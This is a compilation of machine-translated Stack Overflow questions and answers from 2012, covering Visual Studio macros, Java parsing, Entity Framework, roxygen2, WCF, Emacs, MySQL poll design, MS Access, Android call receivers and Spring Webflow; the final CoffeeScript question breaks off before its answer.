# visual-studio-2010 - 当“待更改”视图具有焦点并且选择了源文件时，宏快捷键（Ctrl+Q、Ctrl+C）不起作用（Visual Studio 2010）

> ID：12460320
> 
> 赞同：0
> 
> 时间：2012-09-17T13:30:54.133
> 
> 标签：visual-studio-2010, macros

我有一个宏，它将 Pending Changes 视图中的文件与 Source Control 上的最新版本进行比较。

过程：首先我选择文件，然后运行宏，这工作正常。我尝试分配几个键盘快捷键来运行这个宏：

```
Ctrl+Q,C
Ctrl+Q,Ctrl+Q
Ctrl+Q,Ctrl+C
Ctrl+T,Ctrl+Q
Ctrl+T,Ctrl+C
Ctrl+Shift+\ 
```

我能够在工具->选项->环境->键盘中将它们全部分配，并且它们都没有用于其他任何东西（如“当前使用的快捷方式”中所述）。但是，由于某种原因，Ctrl+Q、Ctrl+C 和 Ctrl+T、Ctrl+C 不起作用。其他工作正常。

那么，为什么 Ctrl+Q、Ctrl+C 或 Ctrl+T、Ctrl+C 不起作用？它是否尝试在 Pending Changes 视图中复制所选文件，而不是使用 Ctrl+C 作为宏快捷方式的第二部分？

**编辑：**

好的，首先这是宏代码：

```
Sub CompareMacro()
    DTE.ExecuteCommand("TeamFoundationContextMenus.SourceControlPendingChangesSourceFiles.Compare.TfsContextPendingCheckinsCompareWithLatestVersion")
End Sub 
```

我对其进行了更多测试，这就是我发现的：

*   如果“待更改”视图具有焦点，并且选择了“源文件”列表中的一个项目（因为它必须是此宏才能工作），则窗口将根本不接受 Ctrl+C 组合，状态栏将继续显示'(Ctrl+Q) 被按下。等待和弦的第二个键......'
    *   注意：在这些操作之后，我尝试从剪贴板粘贴，看起来它使用 Ctrl+C 部分进行了复制操作 - 粘贴时我得到了类似 'Filename.cs edit D:\path...' 的内容。
*   如果“待更改”视图具有焦点并且没有选择“源文件”列表中的任何项目（我可以通过重新启动 Visual Studio 取消选择所有项目），则快捷方式将起作用，但宏将按预期失败（因为它需要选择项目）。
*   如果选择了“源文件”中的一个项目，并且焦点从挂起的更改窗口移动到任何其他 Visual Studio 窗口（至少我尝试过的那些：例如主窗口、解决方案资源管理器、查找符号结果等），则快捷方式和宏将工作。如果我在按下任何键之前或在按下 Ctrl+Q 之后但在 Ctrl+C 之前移动焦点都没有关系，它在这两种情况下都可以工作。
*   我什至尝试在主视觉工作室视图中选择一些代码，将焦点放在该主视图上 - 快捷方式和宏将在不将此代码复制到剪贴板的情况下工作（与焦点位于“待更改”时不同）。

在这种情况下，'Pending Changes' 处理 Ctrl+C 的方式是否与其他视图不同？

# javascript - Flexslider 2.1 内联样式问题

> ID：12460322
> 
> 赞同：0
> 
> 时间：2012-09-17T13:31:03.113
> 
> 标签：javascript, html, css, responsive-design, flexslider

我使用 flexslider2 来展示我的幻灯片。

但我有一个问题，我的 li 元素的宽度在第一页加载时计算错误。

当我打开 firebug 并单击内联样式时，宽度会发生变化，并且所有内容都正确显示。此外，当我调整浏览器大小时，一切都是正确的。

为什么我有这个问题？

当我查看 flexslider 代码时，我发现：

```
 slider.computedW = slider.itemW - slider.boxPadding; 
```

这应该没问题....因为在调整大小时，它只使用计算的W：

```
 if (vars.smoothHeight) methods.smoothHeight();
        slider.newSlides.width(slider.computedW);
        slider.setProps(slider.computedW, "setTotal"); 
```

请帮我！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-20T19:08:21.603

你有你的 flexslider 在容器里吗？如果是这样，您可以将 flexslider 设置为在页面加载时自动调整到该特定高度。

```
 $(document).ready(function(){
  var containerheight = $(".flexcontainer");    
  var borderWidth = $('.flexslider').css('height', containerheight.outerWidth());
    }); 
```

另外，如果你的容器比你的 flexslider 稍微高一点，你可以在下面使用。（“5”是您想要改变高度的像素数）

```
 $(document).ready(function(){
  var containerheight = $(".flexcontainer");
  containerheight = containerheight -5;
  var borderWidth = $('.flexslider').css('height', containerheight.outerWidth());
    }); 
```

# java - 与字符串变量相乘

> ID：12460331
> 
> 赞同：-4
> 
> 时间：2012-09-17T13:31:23.993
> 
> 标签：java

我使用代码保存了一些用户输入；

```
String message3 = console.nextLine(); 
```

现在我想将变量 message3 乘以一个固定数字（比如 5.2）并再次在控制台上向用户显示该结果。message3 永远是一个数字

我试过使用代码：

```
String message4 = message3 * 3; 
```

但它出现了以下错误：操作符 * 未定义参数类型 String, int。我知道当我删除 message3 并将其替换为有效的数字时。那么如何让变量 message3 与另一个数字相乘呢？我必须重命名message3吗？谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-17T13:33:51.500

您必须将该字符串转换为原始数字。

你可以这样做

```
int integerNumber = Integer.parseInt(message3); 
```

或者

```
double doubleNumber = Double.parseDouble(message3); 
```

如果字符串不包含可转换的数字，则会抛出异常。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:34:14.187

您应该首先转换类型以使乘法成为可能：

```
String message4 = Double.toString(Double.parseDouble(message3) * 3); 
```

作为非数字类型，`*`运算符对 没有任何意义`String`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T13:34:07.857

您需要转换`message3`为整数才能对乘法有效：

```
int result = Integer.parseInt(message3) * 3; 
```

然后您可以将其分配给一个字符串，如下所示：

```
String message4 = "" + result; // or just Integer.toString(result); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T13:34:51.843

您必须首先将字符串转换为整数。使用 java api，您可以使用 parseInt(String) 或使用 Integer(wrapper class) 构造函数来实现这一点，如下所示

```
 approach1
    String num="4";
     Integer.parseInt(num)*10;

   It throws Number format exception if the string is a non parsable int

  approach2
  String num="4";
   Integer i = new Integer(num) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-17T13:35:05.080

如果输入是整数，您可以这样做：

```
String message3 = console.nextLine();
Integer myNumber = Integer.valueOf(message3) * 3; 
```

或者

```
int myNumber = Integer.parseInt(message3) * 3; 
```

为您要执行的操作使用适当的类型。

# c# - EntityFramework,添加一个属性并除以其他列

> ID：12460336
> 
> 赞同：0
> 
> 时间：2012-09-17T13:32:00.357
> 
> 标签：c#, asp.net, entity-framework

我有这个数据库模型，其中有一列保存分数，在这种情况下，它是过去 x 个月内给予项目的所有分数的汇总值..无论如何.. 我还有另一列保存数字在与分数相同的 x 个月内完成的投票数...（分数可以由用户给出 1-10 的值）

我现在需要获取分数/投票值..我想为我的实体模型创建一个新属性，该属性包含分数/投票值..我该怎么做？...我尝试通过简单地创建一个标量属性，但我无法让它工作..有人能指出我正确的方向吗？

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:36:32.163

您可以使用部分类：

```
public partial class MyEntity
{
     public double MyComputedValue
     {
        get
        {
            return this.Score/this.Value;
        }
     }
} 
```

这允许您向实体添加功能 - 部分类名称应与您的实体名称（也被声明为部分类）匹配，当您使用它时，您将看到两个部分类属性在逻辑类中都可用。这可以（以某种方式）与数据库中创建一个逻辑结构的两个表上的连接进行比较。

# jquery - jqGrid - 字段的多重验证

> ID：12460345
> 
> 赞同：1
> 
> 时间：2012-09-17T13:32:21.673
> 
> 标签：jquery, validation, jqgrid

我正在尝试验证类似于如何完成的多个日期字段

[jqGrid - 字段验证](https://stackoverflow.com/questions/12398581/jqgrid-validation-of-fields)

我按照示例遇到了一个问题，即用户能够选择多个字段，因为它们仍然是可编辑的，但在选择另一个字段后无法恢复显示模式。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T21:21:48.683

您描述的问题仅与内联编辑的实现有关，与多个字段的验证无关。

查看[另一个使用相同验证的演示](http://www.ok-soft-gmbh.com/jqGrid/2filedsvalidation2.htm)，但它解决了所描述的问题。

# r - 使用 roxygen2 处理示例文件：反斜杠重复（\dontrun 变为 \\dontrun）

> ID：12460347
> 
> 赞同：11
> 
> 时间：2012-09-17T13:32:50.967
> 
> 标签：r, roxygen, roxygen2

## 实际问题

如何避免`\dontrun{`在包含示例的**单独文件**`\\dontrun{`中在 roxygenizing 后变成相应的 Rd 文件？

我确实找到了一种解决方法，但感觉好像我可能只是遗漏了一些明显的东西，即`roxigenize()`.

## 细节

我想我注意到一个可能的错误，或者，恕我直言，在处理存储在**单独文件中的**[roxygen2](http://cran.r-project.org/web/packages/roxygen2/index.html)示例时（而不是在实际的 roxygen 代码中说明它），至少是一种不良行为。

 **问题是`\dontrun{`各个示例文件`\\dontrun{`中的行在 roxygenizing 后变成了生成的 Rd 文件。

您将在下面找到该行为的说明以及简单的解决方法

## 1）确保目录

```
dir.create("src", recursive=TRUE, showWarnings=FALSE)
dir.create("package", recursive=TRUE, showWarnings=FALSE)

# Ensure empty package directory
subdirs <- list.files("package", full.names=TRUE)
if (length(subdirs)) {
    sapply(subdirs, unlink, recursive=TRUE)
} 
```

## 2) 使用两种不同的嵌入示例方式创建示例函数

```
foo1 <- function(x) {message("I'm foo #1"); return(TRUE)}
roxy.1 <- c(
    "#' Title foo1()",
    "#'", 
    "#' Description foo1().",
    "##' This line is commented out",
    "#'", 
    "#' @param x Some R object that doesn't matter.",
    "#' @return \\code{TRUE}.",
    "#' @references \\url{http://www.something.com/}",
    "#' @author John Doe \\email{john.doe@@something.com}",
    "#' @seealso \\code{\\link{foo2}}",
    "#' @example inst/examples/foo1.R"
)
ex.1 <- c(
    "\\dontrun{",
    "foo1()",
    "}"
)

foo2 <- function(y) {message("I'm foo #2"); return(FALSE)}
roxy.2 <- c(
    "#' Title foo2()",
    "#'", 
    "#' Description foo2().",
    "##' This line is commented out",
    "#'", 
    "#' @param y Some R object that doesn't matter.",
    "#' @return \\code{FALSE}.",
    "#' @references \\url{http://www.something.com/}",
    "#' @author John Doe \\email{john.doe@@something.com}",
    "#' @seealso \\code{\\link{foo1}}",
    "#' @examples", 
    "#' \\dontrun{",
    "#' foo2()}",
    "#' }"
)

write(roxy.1, file="src/foo1.R")
write(c("foo1 <-", deparse(foo1)), file="src/foo1.R", append=TRUE)
write(roxy.2, file="src/foo2.R")
write(c("foo2 <-", deparse(foo2)), file="src/foo2.R", append=TRUE) 
```

## 3) 创建包骨架

```
package.skeleton(name="test", path="package", 
    code_files=c("src/foo1.R", "src/foo2.R")) 
```

## 4）创建单独的示例文件`foo1()`

```
dir.create("package/test/inst/examples", recursive=TRUE, showWarnings=FALSE)
write(ex.1, file="package/test/inst/examples/foo1.R") 
```

## 5) 充氧

```
require("roxygen2")
roxygenize(
    package.dir="package/test",
    overwrite=TRUE, 
    unlink.target=FALSE,
    roclets = c("collate", "namespace", "rd")
) 
```

## 6) 检查包裹

```
shell("R CMD check package/test", intern=FALSE) 
```

R CMD 检查的截断输出表明`\dontrun{`in存在问题`./package/test/man/foo1.Rd`

```
[...]
Warning: parse error in file 'test-Ex.R':
1: unexpected input
19: 
20: \
    ^
* checking examples ... ERROR
Running examples in 'test-Ex.R' failed
The error most likely occurred in:

> ### Name: foo1
> ### Title: Title foo1()
> ### Aliases: foo1
> 
> ### ** Examples
> 
> \dontrun{
Error: unexpected input in "\"
Execution halted
Warning message:
In shell(expr, intern = FALSE) :
  'R CMD check package/test' execution failed with error code 1
> 
```

## 7) 解决方法

```
patchRdFiles <- function( 
    path="package",
    name,
    ...
) {
    path <- file.path(path, name, "man")
    if (!file.exists(path)) {
        stop(paste("Invalid directory path: '", path, "'", sep=""))
    }
    files <- list.files(path, full.names=TRUE)  
#ii=files[1]    
    .dead <- sapply(files, function(ii) {
        cnt <- readLines(ii, warn=FALSE)
        if (length(grep("\\\\\\\\dontrun", cnt, perl=TRUE))) {
            message(paste("Correcting: '", ii, "'", sep=""))
            write(gsub("\\\\dontrun", "\\dontrun", cnt), file=ii)
        }
        return(NULL)
    })
    return(TRUE)
} 
```

这将删除 Rd 文件中所有重复的反斜杠：

```
patchRdFiles(name="test") 
```

8) 再次检查包裹

```
# CHECK PACKAGE AGAIN
path <- "package/test"
expr <- paste("R CMD check", path)
shell(expr, intern=FALSE) 
```

再次检查 R CMD 检查的截断输出。有问题的 Rd 文件现在通过了检查。当前错误是由不完整引起的`./package/test/man/test-package.Rd`，此时可以

```
[...]
Warning: parse error in file 'test-Ex.R':
11: unexpected symbol
56: 
57: ~~ simple examples
              ^
* checking examples ... ERROR
Running examples in 'test-Ex.R' failed
The error most likely occurred in:

> ### Name: test-package
> ### Title: What the package does (short line) ~~ package title ~~
> ### Aliases: test-package test
> ### Keywords: package
> 
> ### ** Examples
> 
> ~~ simple examples of the most important functions ~~
Error: unexpected symbol in "~~ simple examples"
Execution halted
Warning message:
In shell(expr, intern = FALSE) :
  'R CMD check package/test' execution failed with error code 1
> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-03-23T23:05:07.717

这是 roxygen2 最新版本中修复的错误。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-01T22:14:49.847

A (more simple) [temporary fix](https://github.com/jeroenooms/roxygen/commit/32b8ac9e55d2973aa95c0e4faa4a3a8db3c930ab) is implemented in this branch: [https://github.com/jeroenooms/roxygen/tree/patch_dontrun](https://github.com/jeroenooms/roxygen/tree/patch_dontrun).

See the [commit](https://github.com/jeroenooms/roxygen/commit/32b8ac9e55d2973aa95c0e4faa4a3a8db3c930ab) for the change. Its a one-line fix. I have also sent a pull request to peter, so hopefully it will get adopted in the main package.**

# c# - 如何正确关闭通道工厂？

> ID：12460348
> 
> 赞同：0
> 
> 时间：2012-09-17T13:32:54.197
> 
> 标签：c#, wcf, channelfactory, servicehost

我想知道如何正确关闭 channelFactory。实际上，我正在使用：

```
try
{
   factory.Close(TimeSpan.FromSeconds(0.25))
}
catch
{
   factory.Abort();
} 
```

但是到 ServiceHost 方面，未处理的异常到达域级别（应用程序的顶层）。我不明白为什么服务主机不捕获异常并使用我配置的 IErrorHandler 处理它。

这就是我配置 ErrorHandler 的方式：

```
IErrorHandler handler = new ErrorHandler();
foreach (var channelDispatcher in host.ChannelDispatchers.Select(d => d as ChannelDispatcher).Where(d => d != null))
{
    channelDispatcher.ErrorHandlers.Add(handler);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:12:23.407

您应该在调用 Abort() 之前检查您的工厂是否为空：

```
try
{
    factory.Close(TimeSpan.FromSeconds(0.25))
}
catch
{
    if (factory != null)
    {
        factory.Abort();
    }
    throw;
} 
```

# emacs - 为什么 (commandp '(customize-option 'foo)) 为零？

> ID：12460355
> 
> 赞同：0
> 
> 时间：2012-09-17T13:33:14.217
> 
> 标签：emacs, lisp, elisp

我想将`customize-option`某个变量绑定到一个键，因为我需要经常更改它。我有两个选择：

```
(global-set-key (kbd "<f12>") '(lambda() (interactive) (customize-option 'my-variable) ) )
(global-set-key (kbd "<f12>") '(customize-option 'my-variable ) 
```

第一个有效，第二个无效，因为`commandp`抱怨这`customize-option`不是命令。为什么？据我所知，`customize-option`是一个交互功能，所以`commandp`应该是`t`：

> custom-option 是一个交互式编译的 Lisp 函数。
> 
> 它是必然的。
> 
> （自定义选项符号）
> 
> 自定义 SYMBOL，它必须是用户选项变量。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T16:15:25.140

的第二个参数`global-set-key`必须是*命令定义*，通常是命名交互函数的符号。交互式函数是一个以`(interactive)`表单开头的函数。例如：

```
(defun delete-to-end ()
  "Delete text from point to the end of buffer."
  (interactive)
  (delete-region (point) (point-max))) 
```

这定义了一个交互函数并将其分配给符号`delete-to-end`。之后，`delete-to-end`是一个可以传递给的有效命令`global-set-key`：

```
(global-set-key [f12] 'delete-to-end) 
```

如果没有该`(interactive)`行，`delete-to-end`仍然会命名一个可从 Lisp 程序调用的函数，但它不会是“命令”。由于它被标记为交互式，因此`(commandp 'delete-to-end)`返回 true，并且`M-x delete-to-end`可以正常工作。

交互函数不需要绑定到符号，它们可以是匿名的。与任何其他匿名函数一样，它们是使用`lambda`表单创建的，除了命令还必须包含`(interactive)`. 匿名命令可以作为第二个参数传递给 ，`global-set-key`而无需将它们分配给符号，因此以下定义等效于上述定义：

```
(global-set-key [f12]
                (lambda ()
                  "Delete text from point to the end of buffer."
                  (interactive)
                  (delete-region (point) (point-max)))) 
```

...除了它的可读性稍差，用`C-h c` or检查时看起来更丑`C-h k`。

在您的情况下，第一次调用`global-set-key`被赋予了一个有效的命令（引用的`lambda`形式本身就是一个有效的函数），但第二个不是，它被赋予了一个既不能被调用也不能满足要求的双元素列表被标记为“交互式”。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-17T13:39:05.007

它`(customize-option 'my-variable)`是不是命令的形式。您不能绑定到任意引用的形式，就像您不能绑定到文字字符串或未绑定的符号一样。其中一些对绑定很有用，但解决这些限制并不难。如果您觉得难以忍受，请编写一个宏。（俗话说，现在你有两个问题。）

# javafx-2 - 如何使用 FXML 中的类路径资源以与 SceneBuilder 保持兼容？

> ID：12460357
> 
> 赞同：1
> 
> 时间：2012-09-17T13:33:20.307
> 
> 标签：javafx-2, scenebuilder

当我在这样的 FXML 代码中使用图像时...

```
<Image url="@/de/myprj/assets/icons/arrow.png" /> 
```

...一切都很好，直到我想在 SceneBuilder 中编辑 FXML 文件。我如何在带有 SceneBuilder 的 FXML 中使用这些资源？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T15:56:50.267

使用 CSS 设置图像要安全得多，无论是在场景构建器中，还是最好在特定于您的应用程序的样式表中。

结帐：[http ://docs.oracle.com/javafx/2/api/javafx/scene/doc-files/cssref.html#imageview](http://docs.oracle.com/javafx/2/api/javafx/scene/doc-files/cssref.html#imageview)

**编辑：**

创建一个 css 文件，在启动应用程序时将其加载到场景的 css 文件中。

```
scene.getStylesheets().add(new File("mycss.css").toURI().toString()); 
```

在您的 CSS 文件中添加以下内容：

```
.the-image {
    -fx-image: url("theimage.png");
} 
```

确保在与您的 css 文件相同的目录中有一个名为 theimage.png 的文件。在场景构建器中，单击 ImageView。在标有“样式类”的框中添加字符串 the-image。

瞧。

# perl - 你如何维护使用 cpanm 安装的 Perl 包？

> ID：12460358
> 
> 赞同：2
> 
> 时间：2012-09-17T13:33:22.707
> 
> 标签：perl, cpan

我使用[cpanminus](http://cpanmin.us)将 Perl 包安装到用户空间，但之后我还没有找到惯用的方法来维护包。您如何更新、删除（带有依赖项）并获取列出的软件包的概述？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:40:35.683

您可以使用[cpan-outdated](http://search.cpan.org/perldoc?cpan-outdated)。手册页有关于如何使用 cpanminus 的明确说明。

# mysql - 该数据最有效的数据库设计

> ID：12460362
> 
> 赞同：1
> 
> 时间：2012-09-17T13:33:39.447
> 
> 标签：mysql, sql, database, voting

我会说我的数据库知识是合理的，我为此使用了 MySQL (InnoDb)，并且也完成了一些 Postgres 工作。反正...

*   我有很多是或否的问题。
*   大量的人可以为同一个民意调查做出贡献。
*   用户可以选择任一选项，这将记录在数据库中。
*   用户可以稍后改变主意并交换需要更新存储数据的选择。

我目前存储这些数据的计划：

*   POLLID、用户ID、决策、时间戳

显然用户数据在另一个表中。

要添加他们的选择，我必须查询他们之前是否投票并插入，否则，更新。如果我想查看民意调查结果，每次有人想查看民意调查时，我都需要遍历所有决策（尽管是索引部分）。

我的问题是

1.  有没有更有效的方法来存储/查询这个？
2.  我会有关于 POLLID 或 POLLID 和 USERID 的索引（可能只是一个唯一约束）吗？或其他？
3.  附加问题：为什么我不能像在 Postgres 中那样在我的表上选择 HASH 和 BTREE 索引？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:46:09.483

设计听起来不错，有几个想法：

民意调查表：民意调查ID，问题。

选项表：选项 id、文本。

将投票链接到选项的表：poll id->choice ids。

用户表：用户详细信息、用户 ID。

投票表：（用户 ID、投票 ID）、选项 ID、时间戳。（括号是唯一的一对）

为单个用户插入/更新可以正常工作，因为您只需检查用户 ID 和投票 ID 是否存在条目。

与使用 COUNT 进行迭代相比，您可以更轻松地查看结果。

```
e.g.: SELECT COUNT(*) FROM votes WHERE pollid = id AND decision = choiceid 
```

这会告诉你有多少人在民意调查“pollid”中投票给了“choiceid”。

后期编辑：

这是一种在不存在时插入并在存在时更新的方法：

```
IF EXISTS (SELECT * FROM TableName WHERE UserId='Uid' AND PollId = 'pollid')
    UPDATE TableName SET (set values here) WHERE UserId='Uid' AND PollId = 'pollid'
ELSE   
    INSERT INTO TableName VALUES (insert values here) 
```

# jquery - 在 GridView 中单击执行 JQuery

> ID：12460363
> 
> 赞同：0
> 
> 时间：2012-09-17T13:33:42.473
> 
> 标签：jquery, asp.net, css, gridview

我正在尝试调整我在页面上用于模式窗口的背景 div 的高度。模态显示在 GridView 中单击，并且应将模态背景 div 的高度设置为与`body`元素相同的高度。

```
<asp:TemplateField HeaderText="Booking Agent" SortExpression="clientname">
    <ItemTemplate>
        <asp:LinkButton runat="server" ID="lnkSMSDriver" Text='<%# Eval("clientname") %>'
        CommandName="SMSClient" CommandArgument='<%# Eval("clientid") %>' CssClass="callModal"></asp:LinkButton>
    </ItemTemplate>
</asp:TemplateField>

<script type="text/javascript">
    $(".callModal").click(function() {
        $(".modalbg").css("height", $("body").css("height"));
    });
</script> 
```

据推测，这应该将模式背景设置为页面上所有内容的相同高度，而不管滚动。

至少，这是我想要完成的。`modalbg`但问题是， div的高度一直设置为 0。

我看不到我在这里做错了什么，有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T13:46:57.440

也许试试这个？

```
$(".callModal").click(function() {
    var bodyHeight = $("body").outerHeight();
    $(".modalbg").css("height", bodyHeight);
}); 
```

# vba - 使用 MS Access 插入 SQL 失败

> ID：12460367
> 
> 赞同：1
> 
> 时间：2012-09-17T13:33:56.713
> 
> 标签：vba, ms-access

我刚刚开始使用 Access 进行一些编码并尝试创建一个将行添加到表中的函数，但这不起作用。

我创建了一个简单的表（Table1），其中包含两列“FirstName”和“LastName”以及一个触发以下代码的按钮：

```
Private Sub Command0_Click()
    AppendRow "Table1", "John", "Doe"
End Sub 
```

AppendRow 在哪里：

```
Function AppendRow(toTableName As String, firstName As String, lastName As String) As Boolean
   ' Returns True on success, false otherwise
   ' USAGE: AppendRow "toTableName", "firstName", "lastName"

   On Error GoTo errhandler
   Dim strSql As String

   'Create the SQL string
   strSql = "INSERT INTO " & toTableName & " (FirstName, LastName) " & _
        "VALUES ('" & firstName & "', '" & lastName & "');"

   'Print the SQL so we can paste into the query build if there are errors
   Debug.Print strSql
   MsgBox strSql

   'Run the SQL Query
   CurrentDb.Execute strSql

   'If no errors return true
   AppendRow = True

ExitHere:
   Exit Function

errhandler:
   'There is an error return false
   AppendRow = False
   With Err
      MsgBox "Error " & .Number & vbCrLf & .Description, vbOKOnly Or vbCritical, "AppendTable"
   End With
   Resume ExitHere
End Function 
```

SQL 字符串如下所示

```
INSERT INTO Table1 (FirstName, LastName) VALUES ('John', 'Doe') 
```

**编辑**：添加了缺少的引号。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T17:30:24.037

您报告说您现在引用了您尝试插入的文本值，但是您没有插入该行并且显然没有错误消息。我不明白为什么会这样，并提供这个简单的程序只是为了看看你是否可以得到一些工作。

```
Public Sub AppendRow(ByVal toTableName As String, _
        ByVal pFirstName As String, _
        ByVal pLastName As String)
    Dim db As DAO.Database
    Dim rs As DAO.Recordset
    '* ensure SetWarnings is not off *'
    DoCmd.SetWarnings True
    Set db = CurrentDb
    Set rs = db.OpenRecordset(toTableName, dbOpenTable, dbAppendOnly)
    With rs
        .AddNew
        !firstName = pFirstName
        !lastName = pLastName
        .Update
        .Close
    End With
    Set rs = Nothing
    Set db = Nothing
End Sub 
```

我没有包括错误处理，因为这仅用于测试。我将其设为子例程而不是函数，因为我注意到您没有在调用该函数的代码中使用该函数的返回值。

如果这对您不起作用，请告诉我们您收到的错误消息以及该过程中的哪一行触发了错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-11-06T13:25:31.060

在我从 OpenRecordSet 函数调用中删除 dbAppendOnly 选项之前，HansUp 的代码对我不起作用。MS 帮助文档暗示它仅对 Dynaset RecordSets 有效，对 TableSet Recordsets 无效。将其更改为“Set rs = db.OpenRecordset(toTableName, dbOpenTable)”并且它起作用了。

但他的代码非常有帮助，我非常感激。我一直在四处走动，也无法让我的 .Execute "INSERT"...-type 代码工作。我不知道这是怎么回事。它曾经奏效过，我做了一个小改动……也许我的血压因恶化而达到顶峰与此有关。

顺便说一句，@ymail.com 是一个有效的电子邮件域，尽管您的自动地址检查器说了什么。

# iphone - 从字符串中提取子字符串？

> ID：12460368
> 
> 赞同：0
> 
> 时间：2012-09-17T13:33:56.747
> 
> 标签：iphone, objective-c, string, ipad, nsstring

我需要从一个字符串中提取一个字符串。唯一的麻烦是在我的情况下具体如何解决。

可以说这是主字符串：

```
City = My City;
Street = My Street 1\nMy Street 2; 
```

所以，我想分别提取这三个东西 `My City`：`My Street 1`和`My Street 2`。

那么我该怎么做呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T13:40:57.037

您可以使用 String 的 componentsSeparatedByString:<#(NSString *)#> 方法，它将为您提供拆分字符串数组。

在你的情况下，做

```
NSArray * array = [YourString componentsSeparatedByString:@" = "]; 
```

在 [array objectAtIndex:2] 你会发现“My Street 1\nMy Street 2;” （考虑到字符串以“My Street 1\nMy Street 2;”开头）

然后你可以在你的情况下再次用 <#(NSString *)#> 分割它们 @"\n"

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T13:39:47.993

不确定是否理解您的问题

要在子字符串中分隔字符串，您可以使用

```
[[string componentsSeparatedByString:@"\n"] lastObject]; 
```

获得地址的第二部分。应用相同的方法来获取第一个对象，但不能使用 lastObject。

但我不确定你的问题

# android - 我希望我的 android 应用程序在电话接听电话时启动并获取来电号码

> ID：12460371
> 
> 赞同：1
> 
> 时间：2012-09-17T13:34:00.230
> 
> 标签：android

我希望我的 android 应用程序在电话接听电话时启动并获取来电号码，我能够在来电屏幕上放置按钮，在此之前能够拨打电话号码，它会对我有很大帮助，任何人都可以向我推荐一些示例或材料。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T13:38:32.670

你可以`broadcastlistener`在你的`AndroidManifet.xml`你必须设置你的意图来监听[`android.intent.action.PHONE_STATE`](http://developer.android.com/reference/android/telephony/TelephonyManager.html#ACTION_PHONE_STATE_CHANGED) 然后你从意图中获取电话状态`intent.getExtraString(TelephonyManager.EXTRA_STATE)` 。如果是`OFFHOOK`或`RINGING`之后有电话打进来，您可以从意图中获取电话号码[`intent.getExtraString(TelephonyManager.EXTRA_INCOMING_NUMBER)`](http://developer.android.com/reference/android/telephony/TelephonyManager.html#EXTRA_INCOMING_NUMBER)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-16T10:11:23.090

这将敬酒并记录传入的号码...

```
 public class CallReceiveD extends BroadcastReceiver {

@Override
public void onReceive(Context context, Intent intent) {
    // TODO Auto-generated method stub

    Bundle extras = intent.getExtras();
    if (extras != null) {
      String state = extras.getString(TelephonyManager.EXTRA_STATE);
      Log.w("DEBUG", state);
      if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
        String phoneNumber = extras
            .getString(TelephonyManager.EXTRA_INCOMING_NUMBER);

       Toast toast= Toast.makeText(context,phoneNumber, Toast.LENGTH_LONG);toast.show();

        Log.w("DEBUG", phoneNumber);
      }
    }

}

      } 
```

不要忘记清单文件 <receiver android:name=".CallReceiveD"> <action android:name="android.intent.action.PHONE_STATE" />

```
 </intent-filter>
        </receiver> 
```

# java - Spring Webflow 上的动态下拉菜单

> ID：12460372
> 
> 赞同：0
> 
> 时间：2012-09-17T13:34:01.090
> 
> 标签：java, dynamic, drop-down-menu, spring-webflow

我想知道在 Spring Webflow 环境中实现动态下拉菜单的最佳方式。

在过去的 3 个小时里，我一直在谷歌上搜索，我对如何实现它有几个想法。我的问题与了解清洁度和最佳实践方面的最佳解决方案有关。

我正在考虑创建一个 Spring MVC 控制器，它接收带有我所需参数的 AJAX 请求，并在响应中发送 JSON 列表。该请求将使用 jQuery 创建，因此响应也将使用 jQuery 处理，从而创建更新所需的下拉菜单。

此外，无论解决方案如何，我都想避免在 jQuery 处理程序中直接创建每个标签。不提供 jQuery 一种机制或实用程序，例如，通过接收数组来更新下拉菜单？

有小费吗？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T23:18:41.840

我是这样做的。

```
<form:form commandName="dateRange">
    <!-- ... -->
    <select name="fyForDR" id="fyForDR" class='discretFont' style='margin-left:10px;margin-right:10px;'>
        <option value="" selected='selected'>Fiscal Year</option>
        <option value="2011" <c:if test="${fyForDR == '2011'}">selected="selected"</c:if> >FY11</option>
        <option value="2010" <c:if test="${fyForDR == '2010'}">selected="selected"</c:if> >FY10</option>
        <option value="2009" <c:if test="${fyForDR == '2009'}">selected="selected"</c:if> >FY09</option>
        <option value="2008" <c:if test="${fyForDR == '2008'}">selected="selected"</c:if> >FY08</option>
        <option value="2007" <c:if test="${fyForDR == '2007'}">selected="selected"</c:if> >FY07</option>
        <option value="2006" <c:if test="${fyForDR == '2006'}">selected="selected"</c:if> >FY06</option>
    </select>
    <script type="text/javascript">
        Spring.addDecoration(new Spring.AjaxEventDecoration({
            elementId: "fyForDR",
            event: "onchange",
            formId:"dateRange",
            params: {fragments:"body", _eventId: "setFy"}
        }));
    </script>
    <!-- ... -->
</form:form> 
```

# command-line - 从 Coffee-script 执行命令行命令

> ID：12460373
> 
> 赞同：3
> 
> 时间：2012-09-17T13:34:03.663
> 
> 标签：command-line, coffeescript

是否可以从 Coffee 脚本执行命令行命令，例如“ll”、“pwd”或任何其他命令？

到目前为止，我试图找到没有运气的例子。

谢谢！

* * *

## 回答 #1

> 赞同：11
> 
